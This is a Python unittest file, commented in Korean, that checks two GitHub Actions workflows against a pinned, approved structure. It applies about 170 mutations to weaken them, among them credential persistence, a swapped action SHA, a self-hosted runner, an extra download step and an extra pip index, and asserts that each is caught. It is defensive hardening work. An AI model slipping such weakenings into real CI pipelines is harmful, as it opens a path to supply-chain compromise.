    "트리거에 workflow_run": (lambda text: change(text, "on:\n  push:\n", "on:\n  push:\n  workflow_run:\n    types: completed\n"), "on 가"),
    "concurrency 의 cancel-in-progress 를 false 로": (lambda text: change(text, "  cancel-in-progress: true\n", "  cancel-in-progress: false\n"), "concurrency 가"),
    "concurrency 묶음 이름에서 이벤트 이름을 뺌": (lambda text: change(text, "group: ci-${{ github.event_name }}-${{ github.ref }}", "group: ci-${{ github.ref }}"), "concurrency 가"),
}
GLOBAL_REASONS = ("읽을 수 없는 표기", "작업 목록", "최상위 키", "on 가", "permissions 가", "concurrency 가", "승인된 액션·SHA")       # 어느 한 작업이 아니라 파일 전체의 규칙 이름


def named(problems, word, job=None):
    """문제 목록에 `word` 가 든 글이 있는가 — `job` 이 주어지고 `word` 가 파일 전체의 규칙 이름이 아니면 그 글이 `작업 <job>:` 으로 시작해야 한다(어느 작업의 규칙이 잡았는지)."""
    scoped = job is not None and word not in GLOBAL_REASONS
    return any(word in problem and (not scoped or problem.startswith("작업 " + job + ": ")) for problem in problems)


def _build_new_ci_mutations():
    """새 표 전부를 하나로 — {이름: (글을 바꾸는 함수, 문제 글에 들어 있어야 할 낱말, 그 문제가 속해야 할 작업(파일 전체 규칙이면 None))}."""
    table = {}

    def simple(job, old, new):
        return lambda text: change_in(text, job, old, new)

    for label, old, new, word in TWIN_SPECS:
        for job in ("test", "qt"):
            table[job + " 작업: " + label] = (simple(job, old, new), word, job)
    for label, old, new, word in QT_ONLY_SPECS:
        table["qt 작업만: " + label] = (simple("qt", old, new), word, "qt")
    for label, (mutate, word) in QT_ONLY_STEPS.items():
        table["qt 작업만: " + label] = (mutate, word, "qt")
    for label, job, old, new in GLOBAL_SCAN_SPECS:
        table["파일 전체: " + label] = (simple(job, old, new), "승인된 액션·SHA", None)
    for label, mutate in JOB_LIST.items():
        table["작업 목록: " + label] = (mutate, "작업 목록", None)
    for label, (mutate, word) in TOP_LEVEL.items():
        table["최상위: " + label] = (mutate, word, None)
    return table


NEW_CI_MUTATIONS = _build_new_ci_mutations()


class ApprovedStructureTest(unittest.TestCase):
    def test_the_real_workflows_are_exactly_the_approved_structure(self):
        self.assertEqual(golden.ci_problems(real("ci.yml")), [])
        self.assertEqual(golden.package_problems(real("package.yml")), [])

    def test_a_windows_line_ending_does_not_change_the_verdict(self):
        self.assertEqual(golden.ci_problems(real("ci.yml").replace("\n", "\r\n")), [])
        self.assertEqual(golden.package_problems(real("package.yml").replace("\n", "\r\n")), [])

    def test_every_action_in_every_workflow_is_one_of_the_approved_owner_repo_and_commit_pairs(self):
        found = 0
        for path in sorted((ROOT / ".github" / "workflows").glob("*.y*ml")):
            text = path.read_bytes().decode("utf-8")
            with self.subTest(file=path.name):
                self.assertEqual(golden.action_problems(text), [])
            found += len(golden.all_action_refs(text))
        self.assertGreaterEqual(found, 8, "액션을 찾지 못했다 — 찾기 규칙이 깨졌다")

    def test_the_approved_pairs_are_three_actions_each_pinned_to_a_full_commit(self):
        self.assertEqual(set(golden.ACTIONS), {"actions/checkout", "actions/setup-python", "actions/upload-artifact"})
        for name, sha in golden.ACTIONS.items():
            with self.subTest(action=name):
                self.assertRegex(sha, r"^[0-9a-f]{40}$")


class TheElevenWeakenedCopiesAreCaughtTest(unittest.TestCase):
    """감사 탐침이 통과시킨 열한 개 — 이 규칙은 모두 잡는다."""

    def test_each_weakened_ci_copy_is_refused(self):
        original = real("ci.yml")
        for label, mutate in CI_MUTATIONS.items():
            with self.subTest(mutation=label):
                self.assertTrue(golden.ci_problems(mutate(original)), "약해진 ci.yml 이 통과했다")

    def test_each_weakened_package_copy_is_refused(self):
        original = real("package.yml")
        for label, mutate in PACKAGE_MUTATIONS.items():
            with self.subTest(mutation=label):
                self.assertTrue(golden.package_problems(mutate(original)), "약해진 package.yml 이 통과했다")

    def test_the_right_rule_names_each_weakening(self):
        """어느 규칙이 잡았는지 — 우연히 다른 이유로 읽기 실패해서 걸린 것이 아니다."""
        ci, package = real("ci.yml"), real("package.yml")
        expected = {
            "①": ("작업 키", golden.ci_problems(CI_MUTATIONS["① 작업 단위 permissions 에 contents·id-token 쓰기"](ci))),
            "②": ("액션", golden.ci_problems(CI_MUTATIONS["② checkout 의 소유자·저장소를 다른 이름으로(40자리 모양만 맞춤)"](ci))),
            "③": ("액션", golden.ci_problems(CI_MUTATIONS["③ checkout 의 SHA 를 다른 40자리로"](ci))),
            "④": ("with", golden.ci_problems(CI_MUTATIONS["④ persist-credentials 를 true 로"](ci))),
            "⑤": ("strategy", golden.ci_problems(CI_MUTATIONS["⑤ matrix 의 os 에 self-hosted 추가"](ci))),
            "⑥": ("작업 키", golden.ci_problems(CI_MUTATIONS["⑥ 작업 단위 env 에 PYTHONPATH"](ci))),
            "⑦": ("단계 목록", golden.package_problems(PACKAGE_MUTATIONS["⑦ 다른 run 단계를 하나 더(내려받기 명령)"](package))),
            "⑧": ("읽을 수 없는 표기", golden.package_problems(PACKAGE_MUTATIONS["⑧ 한 줄 흐름식 단계로 태그 액션 추가"](package))),
            "⑨": ("run 명령", golden.package_problems(PACKAGE_MUTATIONS["⑨ pip 설치에 추가 색인"](package))),
            "⑩": ("run 명령", golden.package_problems(PACKAGE_MUTATIONS["⑩ 빌드 명령을 문자열 출력으로(경로 글자만 남음)"](package))),
            "⑪": ("with", golden.package_problems(PACKAGE_MUTATIONS["⑪ persist-credentials 를 true 로"](package))),
        }
        for label, (word, problems) in expected.items():
            with self.subTest(mutation=label):
                self.assertTrue(any(word in problem for problem in problems), (word, problems))

    def test_other_weakenings_of_the_same_kind_are_refused_too(self):
        ci, package = real("ci.yml"), real("package.yml")
        for label, mutate in CI_OTHER.items():
            with self.subTest(ci=label):
                self.assertTrue(golden.ci_problems(mutate(ci)), "약해진 ci.yml 이 통과했다")
        for label, mutate in PACKAGE_OTHER.items():
            with self.subTest(package=label):
                self.assertTrue(golden.package_problems(mutate(package)), "약해진 package.yml 이 통과했다")

    def test_an_unreadable_or_odd_text_is_a_problem_not_a_crash(self):
        for text in ("", "not: [a mapping", "﻿name: x\n", "a: 1\n\tb: 2\n", "- a\n- b\n", "name: x\n" * 3):
            with self.subTest(text=text[:20]):
                self.assertTrue(golden.ci_problems(text))
                self.assertTrue(golden.package_problems(text))


class TwoJobsAreBothPinnedTest(unittest.TestCase):
    """D-716 — `ci.yml` 의 두 작업(`test`·`qt`)을 모두 글자 그대로 못박는다: 작업 목록(이름·순서·개수)·작업마다의 승인값·승인값 표 자체·새 변이 표."""

    def test_the_approved_table_names_the_jobs_in_file_order(self):
        self.assertEqual(list(golden.CI["jobs"]), ["test", "qt"])
        self.assertEqual(list(golden.PACKAGE["jobs"]), ["package"])

    def test_the_test_job_keeps_exactly_the_values_approved_with_d693(self):
        job = golden.CI["jobs"]["test"]
        self.assertNotIn("name", job)                       # 작업 이름 값은 D-693 때도 못박지 않았다 — 그대로 둔다
        self.assertEqual(job["job_keys"], {"name", "runs-on", "timeout-minutes", "strategy", "steps"})
        self.assertEqual(job["runs_on"], "${{ matrix.os }}")
        self.assertEqual(job["timeout"].pattern, "4[0-9]|5[0-9]|60")
        self.assertEqual(job["strategy"], {"fail-fast": "false", "matrix": {"os": "[ubuntu-latest, windows-latest]", "python": "['3.10', '3.12']", "shard": "[1, 2, 3]"}})
        self.assertIsNone(job["env"])
        self.assertEqual(job["steps"], (
            ("uses", "actions/checkout", {"persist-credentials": "false"}, None),
            ("uses", "actions/setup-python", {"python-version": "${{ matrix.python }}"}, None),
            ("run", "python scripts/ci_shard.py", None, {"PYTHONUTF8": "1", "CI_SHARD": "${{ matrix.shard }}", "CI_SHARD_TOTAL": "3"}),
        ))

    def test_the_qt_job_has_exactly_the_values_of_the_real_file(self):
        job = golden.CI["jobs"]["qt"]
        self.assertEqual(job["name"], "Qt 시험 (windows-latest, Python 3.12, 조각 ${{ matrix.shard }}/3)")
        self.assertEqual(job["job_keys"], {"name", "runs-on", "timeout-minutes", "strategy", "steps"})
        self.assertEqual(job["runs_on"], "windows-latest")
        self.assertEqual(job["timeout"].pattern, "40")
        self.assertEqual(job["strategy"], {"fail-fast": "false", "matrix": {"shard": "[1, 2, 3]"}})
        self.assertIsNone(job["env"])
        self.assertEqual(job["steps"], (
            ("uses", "actions/checkout", {"persist-credentials": "false"}, None),
            ("uses", "actions/setup-python", {"python-version": "3.12"}, None),
            ("run", "python scripts/ci_qt_setup.py", None, None),
            ("run", "python scripts/ci_shard.py", None, {"PYTHONUTF8": "1", "CI_SHARD": "${{ matrix.shard }}", "CI_SHARD_TOTAL": "3", "CI_REQUIRE_QT": "1", "QT_QPA_PLATFORM": "offscreen"}),
        ))
        self.assertEqual(set(job["steps"][3][3]), {"PYTHONUTF8", "CI_SHARD", "CI_SHARD_TOTAL", "CI_REQUIRE_QT", "QT_QPA_PLATFORM"}, "시험 단계의 환경 변수는 정확히 다섯")

    def test_the_time_limit_rules_accept_what_they_should_and_nothing_else(self):
        test_rule, qt_rule = golden.CI["jobs"]["test"]["timeout"], golden.CI["jobs"]["qt"]["timeout"]
        for value in ("40", "45", "59", "60"):
            with self.subTest(test_accepts=value):
                self.assertTrue(test_rule.fullmatch(value))
        for value in ("39", "61", "400", "04", "4", "", "None", "40 ", "4O"):
            with self.subTest(test_refuses=value):
                self.assertFalse(test_rule.fullmatch(value))
        self.assertTrue(qt_rule.fullmatch("40"))
        for value in ("39", "41", "45", "60", "400", "04", "4", "", "None", "40 ", "4O"):
            with self.subTest(qt_refuses=value):
                self.assertFalse(qt_rule.fullmatch(value))

    def test_every_new_weakening_is_refused_for_the_named_reason_in_the_named_job(self):
        original = real("ci.yml")
        self.assertEqual(golden.ci_problems(original), [], "원본은 문제가 없어야 변이 시험이 뜻이 있다")
        for label, (mutate, word, job) in NEW_CI_MUTATIONS.items():
            with self.subTest(mutation=label):
                broken = mutate(original)
                self.assertNotEqual(broken, original, "변이가 글을 바꾸지 못했다")
                problems = golden.ci_problems(broken)
                self.assertTrue(problems, "약해진 ci.yml 이 통과했다")
                self.assertTrue(named(problems, word, job), "엉뚱한 이유로 걸렸다(낱말 " + repr(word) + ", 작업 " + repr(job) + "): " + repr(problems))

    def test_the_new_tables_are_not_silently_emptied_and_treat_both_jobs_alike(self):
        self.assertGreaterEqual(len(TWIN_SPECS), 52)
        self.assertGreaterEqual(len(QT_ONLY_SPECS), 41)
        self.assertGreaterEqual(len(QT_ONLY_STEPS), 6)
        self.assertGreaterEqual(len(GLOBAL_SCAN_SPECS), 2)
        self.assertGreaterEqual(len(JOB_LIST), 9)
        self.assertGreaterEqual(len(TOP_LEVEL), 9)
        self.assertGreaterEqual(len(NEW_CI_MUTATIONS), 171)
        self.assertEqual(len(NEW_CI_MUTATIONS), 2 * len(TWIN_SPECS) + len(QT_ONLY_SPECS) + len(QT_ONLY_STEPS) + len(GLOBAL_SCAN_SPECS) + len(JOB_LIST) + len(TOP_LEVEL), "이름이 겹쳐 표가 줄었다")
        for label, *_ in TWIN_SPECS:
            self.assertIn("test 작업: " + label, NEW_CI_MUTATIONS)
            self.assertIn("qt 작업: " + label, NEW_CI_MUTATIONS)

    def test_the_old_one_job_file_is_refused_with_the_job_list_reason(self):
        problems = golden.ci_problems(only_the_test_job(real("ci.yml")))
        self.assertTrue(named(problems, "작업 목록"), problems)
        self.assertTrue(any("['test', 'qt']" in problem for problem in problems), problems)

    def test_the_job_scoped_change_touches_only_the_named_job(self):
        ci = real("ci.yml")
        head, _, tail = ci.partition(QT_MARK)
        in_qt = change_in(ci, "qt", TIMEOUT_LINE, "    timeout-minutes: 41\n")
        self.assertEqual(in_qt.partition(QT_MARK)[0], head)                  # test 쪽은 그대로
        self.assertEqual(in_qt.count("timeout-minutes: 41"), 1)
        in_test = change_in(ci, "test", TIMEOUT_LINE, "    timeout-minutes: 41\n")
        self.assertEqual(in_test.partition(QT_MARK)[2], tail)                # qt 쪽은 그대로
        self.assertEqual(in_test.count("timeout-minutes: 41"), 1)
        self.assertEqual(ci.count(TIMEOUT_LINE), 2)
        with self.assertRaises(AssertionError):
            change(ci, TIMEOUT_LINE, "x")                                    # 옛 `change` 는 두 작업에 되풀이되는 줄을 못 바꾼다 — `change_in` 이 있는 까닭
        with self.assertRaises(AssertionError):
            change_in(ci, "qt", "이 글은 어디에도 없다", "x")
        with self.assertRaises(AssertionError):
            change_in(ci, "third", TIMEOUT_LINE, "x")
        with self.assertRaises(AssertionError):
            change_in(only_the_test_job(ci), "qt", TIMEOUT_LINE, "x")        # qt 작업 시작 줄이 없으면 거절한다

    def test_the_old_tables_keep_their_text_and_are_scoped_to_the_test_job(self):
        """옛 표(열한 개와 같은 계열)의 변이 글은 바뀌지 않았다 — 감싼 함수가 `test` 작업 쪽에만 걸고 `qt` 작업 글은 건드리지 않는다는 것만 확인한다."""
        ci = real("ci.yml")
        tail = ci.partition(QT_MARK)[2]
        for table in (CI_MUTATIONS, CI_OTHER):
            for label, mutate in table.items():
                with self.subTest(mutation=label):
                    broken = mutate(ci)
                    self.assertNotEqual(broken, ci)
                    self.assertEqual(broken.partition(QT_MARK)[2], tail, "옛 표의 변이가 qt 작업 글을 건드렸다")
        self.assertEqual(len(CI_MUTATIONS), 6)
        self.assertEqual(len(CI_OTHER), 16)

    def test_comment_and_blank_line_edits_do_not_change_the_verdict(self):
        """대조군 — 글자 그대로 견주는 것은 구조(키·값)이고 주석·빈 줄·줄 끝 주석은 아니다. 손봐도 통과해야 허용 목록이 필요 이상으로 까다롭지 않다."""
        ci = real("ci.yml")
        edited = ci
        for job in ("test", "qt"):
            edited = change_in(edited, job, CHECKOUT_HEAD, "      # CANARY 주석 한 줄\n" + CHECKOUT_HEAD)
            edited = change_in(edited, job, TIMEOUT_LINE, "    timeout-minutes: 40  # CANARY 줄 끝 주석\n")
            edited = change_in(edited, job, SHARD_RUN, SHARD_RUN + "\n\n")
        self.assertNotEqual(edited, ci)
        self.assertEqual(golden.ci_problems(edited), [])


if __name__ == "__main__":
    unittest.main()
